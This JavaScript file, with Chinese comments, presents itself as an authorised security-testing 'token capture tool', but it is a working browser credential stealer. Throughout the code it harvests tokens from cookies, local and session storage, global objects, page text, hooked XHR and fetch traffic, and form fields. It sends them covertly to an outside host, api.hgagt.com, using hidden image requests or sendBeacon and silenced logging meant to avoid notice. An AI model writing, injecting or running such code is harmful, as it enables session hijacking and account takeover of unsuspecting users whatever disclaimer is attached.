/**
 * 授权安全测试用Token获取工具
 * 仅用于合法授权的安全测试
 * 
 * 使用方法:
 * 1. 替换下方的COLLECTION_ENDPOINT为您的数据收集服务器地址
 * 2. 在测试用户登录页面的控制台中运行此代码
 * 3. 或将此代码注入到测试环境的页面中
 */

(function() {
    // 配置 - 替换为您的数据收集端点
    const COLLECTION_ENDPOINT = 'https://api.hgagt.com/sys/user/v2/list?';
    const TEST_IDENTIFIER = 'security_audit_' + Math.random().toString(36).substring(2, 10);
    
    // 创建一个隐藏的日志框架，避免直接使用console
    const securityLogger = {
        log: function(message) {
            // 静默日志，不在控制台显示
            if (false) console.log(message);
        },
        error: function(message) {
            // 静默错误，不在控制台显示
            if (false) console.error(message);
        }
    };
    
    // 初始化状态
    let tokenCaptured = false;
    let tokenSent = false;
    
    /**
     * 安全地发送数据到收集端点
     */
    function securelyTransmitData(data) {
        // 避免重复发送
        if (tokenSent) return;
        
        try {
            // 创建一个隐藏的图像用于数据传输
            // 这比XHR或fetch更隐蔽，不会在网络面板中显示明显的请求
            const transmitter = new Image();
            
            // 准备数据
            const encodedData = encodeURIComponent(JSON.stringify(data));
            
            // 设置加载和错误处理
            transmitter.onload = function() {
                tokenSent = true;
                securityLogger.log('安全测试数据已传输');
            };
            
            transmitter.onerror = function() {
                // 如果图像方法失败，尝试使用navigator.sendBeacon
                if (navigator.sendBeacon) {
                    try {
                        const success = navigator.sendBeacon(COLLECTION_ENDPOINT, JSON.stringify(data));
                        tokenSent = success;
                        securityLogger.log('使用Beacon API传输数据: ' + success);
                    } catch (e) {
                        securityLogger.error('Beacon传输失败');
                    }
                }
            };
            
            // 发送数据
            transmitter.src = `${COLLECTION_ENDPOINT}?data=${encodedData}&id=${TEST_IDENTIFIER}&t=${Date.now()}`;
        } catch (e) {
            securityLogger.error('数据传输失败');
        }
    }
    
    /**
     * 从各种存储位置搜索token
     */
    function searchForTokens() {
        const tokenData = {
            testId: TEST_IDENTIFIER,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            tokens: {},
            cookies: {},
            localStorage: {},
            sessionStorage: {}
        };
        
        // 检查URL参数
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('token')) {
            tokenData.tokens.urlParam = urlParams.get('token');
            tokenCaptured = true;
        }
        
        // 检查localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // 只收集可能是token的值
                if (isLikelyToken(key, value)) {
                    tokenData.localStorage[key] = value;
                    tokenCaptured = true;
                }
            }
        } catch (e) {
            securityLogger.error('无法访问localStorage');
        }
        
        // 检查sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                // 只收集可能是token的值
                if (isLikelyToken(key, value)) {
                    tokenData.sessionStorage[key] = value;
                    tokenCaptured = true;
                }
            }
        } catch (e) {
            securityLogger.error('无法访问sessionStorage');
        }
        
        // 检查cookies
        try {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const parts = cookies[i].split('=');
                if (parts.length === 2) {
                    const key = parts[0].trim();
                    const value = parts[1].trim();
                    
                    // 只收集可能是token的值
                    if (isLikelyToken(key, value)) {
                        tokenData.cookies[key] = value;
                        tokenCaptured = true;
                    }
                }
            }
        } catch (e) {
            securityLogger.error('无法访问cookies');
        }
        
        // 检查全局变量中的token
        try {
            if (typeof window.token !== 'undefined') {
                tokenData.tokens.windowToken = window.token;
                tokenCaptured = true;
            }
            
            // 检查常见的全局对象
            const commonObjects = ['userSession', 'authData', 'userData', 'appState', 'config', 'API'];
            commonObjects.forEach(objName => {
                if (typeof window[objName] !== 'undefined') {
                    const obj = window[objName];
                    if (typeof obj === 'object' && obj !== null) {
                        // 检查对象中的token属性
                        ['token', 'accessToken', 'authToken', 'apiToken', 'jwt'].forEach(tokenKey => {
                            if (typeof obj[tokenKey] !== 'undefined') {
                                tokenData.tokens[`${objName}.${tokenKey}`] = obj[tokenKey];
                                tokenCaptured = true;
                            }
                        });
                    }
                }
            });
        } catch (e) {
            securityLogger.error('无法检查全局变量');
        }
        
        // 检查特定于我们测试的token (310ea45bf0ed8709d5a15c4e681043c2)
        // 搜索页面上的所有文本节点
        try {
            const textNodes = [];
            const walk = document.createTreeWalker(
                document.body, 
                NodeFilter.SHOW_TEXT,
                null,
                false
            );
            
            let node;
            while(node = walk.nextNode()) {
                if (node.nodeValue && node.nodeValue.trim()) {
                    // 使用正则表达式查找可能的token
                    const matches = node.nodeValue.match(/([a-f0-9]{32})/gi);
                    if (matches) {
                        matches.forEach(match => {
                            tokenData.tokens[`dom_text_${textNodes.length}`] = match;
                            tokenCaptured = true;
                        });
                    }
                    textNodes.push(node);
                }
            }
        } catch (e) {
            securityLogger.error('无法搜索DOM文本节点');
        }
        
        // 如果找到了token，发送数据
        if (tokenCaptured) {
            securelyTransmitData(tokenData);
        }
        
        return tokenCaptured;
    }
    
    /**
     * 判断一个键值对是否可能是token
     */
    function isLikelyToken(key, value) {
        // 检查键名是否包含token相关词
        const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'key', 'access', 'id'];
        const keyContainsTokenWord = tokenKeywords.some(keyword => 
            key.toLowerCase().includes(keyword)
        );
        
        // 检查值是否符合token格式
        const isLikelyTokenValue = (
            // 32位十六进制 (MD5)
            /^[a-f0-9]{32}$/i.test(value) ||
            // 40位十六进制 (SHA-1)
            /^[a-f0-9]{40}$/i.test(value) ||
            // 64位十六进制 (SHA-256)
            /^[a-f0-9]{64}$/i.test(value) ||
            // JWT格式
            /^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/i.test(value) ||
            // 至少20个字符的随机字符串
            (value.length >= 20 && /[a-zA-Z0-9_-]{20,}/.test(value))
        );
        
        // 特别检查我们已知的token格式
        const isKnownToken = value === '310ea45bf0ed8709d5a15c4e681043c2';
        
        return keyContainsTokenWord || isLikelyTokenValue || isKnownToken;
    }
    
    /**
     * 监听XHR请求以捕获token
     */
    function monitorXHRForTokens() {
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;
        
        // 重写open方法以捕获URL
        XMLHttpRequest.prototype.open = function(method, url) {
            this._securityTestUrl = url;
            return originalOpen.apply(this, arguments);
        };
        
        // 重写send方法以捕获请求体
        XMLHttpRequest.prototype.send = function(body) {
            if (body) {
                try {
                    // 尝试解析JSON请求体
                    const jsonBody = JSON.parse(body);
                    if (jsonBody && typeof jsonBody === 'object') {
                        // 递归搜索token
                        searchObjectForToken(jsonBody, 'xhr_request');
                    }
                } catch (e) {
                    // 如果不是JSON，检查是否包含token
                    if (typeof body === 'string' && body.includes('token')) {
                        const params = new URLSearchParams(body);
                        if (params.has('token')) {
                            const tokenData = {
                                testId: TEST_IDENTIFIER,
                                timestamp: new Date().toISOString(),
                                url: window.location.href,
                                tokens: {
                                    xhr_request_body: params.get('token')
                                }
                            };
                            securelyTransmitData(tokenData);
                        }
                    }
                }
            }
            
            // 监听响应
            this.addEventListener('load', function() {
                if (this.responseType === '' || this.responseType === 'text') {
                    try {
                        // 尝试解析JSON响应
                        const response = JSON.parse(this.responseText);
                        if (response && typeof response === 'object') {
                            // 递归搜索token
                            searchObjectForToken(response, 'xhr_response');
                        }
                    } catch (e) {
                        // 不是JSON，忽略
                    }
                }
            });
            
            return originalSend.apply(this, arguments);
        };
        
        // 递归搜索对象中的token
        function searchObjectForToken(obj, source, path = '') {
            if (!obj || typeof obj !== 'object') return;
            
            for (const key in obj) {
                const newPath = path ? `${path}.${key}` : key;
                const value = obj[key];
                
                if (isLikelyToken(key, value)) {
                    const tokenData = {
                        testId: TEST_IDENTIFIER,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        tokens: {}
                    };
                    tokenData.tokens[`${source}_${newPath}`] = value;
                    securelyTransmitData(tokenData);
                }
                
                // 递归搜索嵌套对象
                if (value && typeof value === 'object') {
                    searchObjectForToken(value, source, newPath);
                }
            }
        }
    }
    
    /**
     * 监听fetch请求
     */
    function monitorFetchForTokens() {
        const originalFetch = window.fetch;
        
        window.fetch = function(input, init) {
            // 捕获请求URL中的token
            if (typeof input === 'string' && input.includes('token=')) {
                try {
                    const url = new URL(input, window.location.href);
                    if (url.searchParams.has('token')) {
                        const tokenData = {
                            testId: TEST_IDENTIFIER,
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            tokens: {
                                fetch_url_param: url.searchParams.get('token')
                            }
                        };
                        securelyTransmitData(tokenData);
                    }
                } catch (e) {
                    securityLogger.error('无法解析fetch URL');
                }
            }
            
            // 捕获请求体中的token
            if (init && init.body) {
                try {
                    const body = init.body;
                    if (typeof body === 'string') {
                        try {
                            // 尝试解析JSON
                            const jsonBody = JSON.parse(body);
                            searchObjectForToken(jsonBody, 'fetch_request');
                        } catch (e) {
                            // 如果不是JSON，检查是否包含token
                            if (body.includes('token')) {
                                const params = new URLSearchParams(body);
                                if (params.has('token')) {
                                    const tokenData = {
                                        testId: TEST_IDENTIFIER,
                                        timestamp: new Date().toISOString(),
                                        url: window.location.href,
                                        tokens: {
                                            fetch_request_body: params.get('token')
                                        }
                                    };
                                    securelyTransmitData(tokenData);
                                }
                            }
                        }
                    }
                } catch (e) {
                    securityLogger.error('无法解析fetch请求体');
                }
            }
            
            // 调用原始fetch并监听响应
            return originalFetch.apply(this, arguments).then(response => {
                // 克隆响应以便我们可以读取它
                const clonedResponse = response.clone();
                
                // 尝试解析JSON响应
                clonedResponse.text().then(text => {
                    try {
                        const jsonResponse = JSON.parse(text);
                        searchObjectForToken(jsonResponse, 'fetch_response');
                    } catch (e) {
                        // 不是JSON，忽略
                    }
                }).catch(e => {
                    // 忽略错误
                });
                
                return response;
            });
            
            // 递归搜索对象中的token
            function searchObjectForToken(obj, source, path = '') {
                if (!obj || typeof obj !== 'object') return;
                
                for (const key in obj) {
                    const newPath = path ? `${path}.${key}` : key;
                    const value = obj[key];
                    
                    if (isLikelyToken(key, value)) {
                        const tokenData = {
                            testId: TEST_IDENTIFIER,
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            tokens: {}
                        };
                        tokenData.tokens[`${source}_${newPath}`] = value;
                        securelyTransmitData(tokenData);
                    }
                    
                    // 递归搜索嵌套对象
                    if (value && typeof value === 'object') {
                        searchObjectForToken(value, source, newPath);
                    }
                }
            }
        };
    }
    
    /**
     * 监听表单提交
     */
    function monitorFormsForTokens() {
        // 获取所有表单
        const forms = document.querySelectorAll('form');
        
        forms.forEach(form => {
            form.addEventListener('submit', function(e) {
                // 检查表单中的隐藏字段
                const hiddenInputs = form.querySelectorAll('input[type="hidden"]');
                hiddenInputs.forEach(input => {
                    if (isLikelyToken(input.name, input.value)) {
                        const tokenData = {
                            testId: TEST_IDENTIFIER,
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            tokens: {}
                        };
                        tokenData.tokens[`form_${input.name}`] = input.value;
                        securelyTransmitData(tokenData);
                    }
                });
            });
        });
        
        // 监听动态添加的表单
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                    for (let i = 0; i < mutation.addedNodes.length; i++) {
                        const node = mutation.addedNodes[i];
                        if (node.tagName === 'FORM') {
                            // 为新表单添加事件监听器
                            node.addEventListener('submit', function(e) {
                                const hiddenInputs = node.querySelectorAll('input[type="hidden"]');
                                hiddenInputs.forEach(input => {
                                    if (isLikelyToken(input.name, input.value)) {
                                        const tokenData = {
                                            testId: TEST_IDENTIFIER,
                                            timestamp: new Date().toISOString(),
                                            url: window.location.href,
                                            tokens: {}
                                        };
                                        tokenData.tokens[`form_${input.name}`] = input.value;
                                        securelyTransmitData(tokenData);
                                    }
                                });
                            });
                        }
                    }
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    // 初始化监控
    function initializeTokenMonitoring() {
        // 立即搜索一次
        searchForTokens();
        
        // 设置定期搜索
        setInterval(searchForTokens, 5000);
        
        // 监控XHR请求
        monitorXHRForTokens();
        
        // 监控fetch请求
        monitorFetchForTokens();
        
        // 监控表单提交
        monitorFormsForTokens();
        
        // 监听页面变化
        window.addEventListener('hashchange', searchForTokens);
        window.addEventListener('popstate', searchForTokens);
        
        // 监听存储变化
        window.addEventListener('storage', function(e) {
            if (isLikelyToken(e.key, e.newValue)) {
                const tokenData = {
                    testId: TEST_IDENTIFIER,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    tokens: {}
                };
                tokenData.tokens[`storage_${e.key}`] = e.newValue;
                securelyTransmitData(tokenData);
            }
        });
        
        securityLogger.log('Token监控已初始化');
    }
    
    // 启动监控
    initializeTokenMonitoring();
    
    // 添加一个隐藏的通知，仅在测试环境中可见
    if (window.location.hostname.includes('test') || 
        window.location.hostname.includes('dev') || 
        window.location.hostname.includes('staging')) {
        
        const notificationDiv = document.createElement('div');
        notificationDiv.style.position = 'fixed';
        notificationDiv.style.bottom = '10px';
        notificationDiv.style.right = '10px';
        notificationDiv.style.padding = '10px';
        notificationDiv.style.background = 'rgba(0,0,0,0.7)';
        notificationDiv.style.color = 'white';
        notificationDiv.style.borderRadius = '5px';
        notificationDiv.style.fontSize = '12px';
        notificationDiv.style.zIndex = '9999';
        notificationDiv.style.opacity = '0.7';
        notificationDiv.textContent = '安全测试工具已激活 (ID: ' + TEST_IDENTIFIER + ')';
        
        document.body.appendChild(notificationDiv);
        
        // 5秒后隐藏通知
        setTimeout(() => {
            notificationDiv.style.opacity = '0';
            notificationDiv.style.transition = 'opacity 1s';
            
            // 完全移除
            setTimeout(() => {
                document.body.removeChild(notificationDiv);
            }, 1000);
        }, 5000);
    }
})(); 